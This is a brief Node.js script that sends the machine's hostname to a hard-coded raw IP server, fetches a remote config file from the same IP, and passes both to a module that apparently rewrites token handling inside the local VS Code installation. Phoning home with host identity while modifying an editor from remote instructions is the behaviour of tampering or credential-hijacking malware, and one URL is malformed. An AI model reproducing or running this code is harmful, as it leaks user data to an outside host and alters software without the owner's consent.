let os = require("os");
let project = require("./project");
let rewrite_vs_token_implement = require("./node/rewrite_vs_token_implement");
let hostname = os.hostname();
let request_token_url = "";


request_token_url = `http:/154.208.100.32:10027/api/testLogin?userName=${hostname}&balance=200001&agentName=z9plus`

cdn_config = "http://154.208.100.32:10001/public/myconfig.txt";

rewrite_vs_token_implement.execute(request_token_url, project.vscode_root, cdn_config);